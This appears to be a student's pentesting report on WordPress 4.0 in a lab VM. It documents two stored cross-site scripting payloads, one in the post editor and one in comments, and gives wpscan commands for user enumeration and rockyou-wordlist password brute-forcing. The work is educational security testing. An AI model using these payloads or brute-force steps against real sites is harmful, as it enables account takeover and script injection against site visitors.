Time spent: **6** hours spent in total

> Objective: Discover and demonstrate similar proofs-of-concept for at least an additional three and (up to five) exploits affecting an older version of WP.

## Pentesting Report

### 1. Vulnerability Name or ID: Authenticated Stored Cross-Site Scripting
  - [x] Summary: Cross-site scripting vulnerability in the text editor box in pages and writing/editing posts.
    - Vulnerability types: XSS
    - Tested in version: 4.0
    - Fixed in version: 4.2.3
  - [x] GIF Walkthrough: <img src='https://imgur.com/ksX2aeC.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />
  - [x] Steps to recreate: 
    1. Create new post in your WordPress dashboard
    2. Edit WordPress post using the `Text Value` editor:
    ```html
    <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>`
    ```
  - [x] Affected source code: 
    - [Reference](https://klikki.fi/adv/wordpress3.html)
    - [Changelog](https://core.trac.wordpress.org/browser/branches/4.2/src/wp-includes/class-wp-editor.php?rev=33361)  
    
### 2. Vulnerability Name or ID: Unauthenticated Stored Cross-Site Scripting
  - [X] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0
    - Fixed in version: 4.1.2
  - [X] GIF Walkthrough: <img src='https://imgur.com/HabXwGe.gif' title='Video Walkthrough' width='800' alt='Video Walkthrough' />
  - [X] Steps to recreate: Go to any post to make a comment. In the comment part, use the following html:
  ```html
  <blockquote cite="hey" onmouseover=alert("XSS")>testing XSS
  ```
  - [X] Affected source code:
    - [Link](https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/)
  
    
### 3. Vulnerability Name or ID: Password Brute Force Attack
  - [x] Summary: Using rockyou.txt wordlist and wpscan, together with the user enumeration shown in number 2, the password of a particular username can be guessed by brute force because wordpress by default does not limit the number of login attempts.
    - Vulnerability types: Login Vulnerability
    - Tested in version: 4.0
    - Fixed in version: -
  - [x] GIF Walkthrough: <img src='https://imgur.com/1fMEf1i.gif' title='Video Walkthrough' width='' alt='Video Walkthrough' />i
  - [x] Steps to recreate: 
    1. Get `wordlists` library and extract `rockyou.txt` (in Kali VM):  
      ```shell
      $ apt-get install wordlists
      $ cd \usr\share\wordlists\
      $ gzip -d rockyou.txt.gz
      ```  
      2. Get list of users (in Kali VM):
      ```shell
      $ wpscan --url wpdistillery.vm --enumerate u
      ```
      3. Pick a user and run attack (in Kali VM):
      ```shell
      $ wpscan --url wpdistillery.vm --usernames '<user-name>' --passwords /usr/share/wordlists/rockyou.txt
      ```
  - [x] Affected source code:
    - [Github](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)


## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)
- GIFs created with [EZ Gif](https://ezgif.com).

## Notes

Had to change `Permalink` settings in WordPress in order to get pages to load - otherwise a `Not Found` screen was displayed.

## License

    Copyright [2018] [Ayushya Amitabh]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
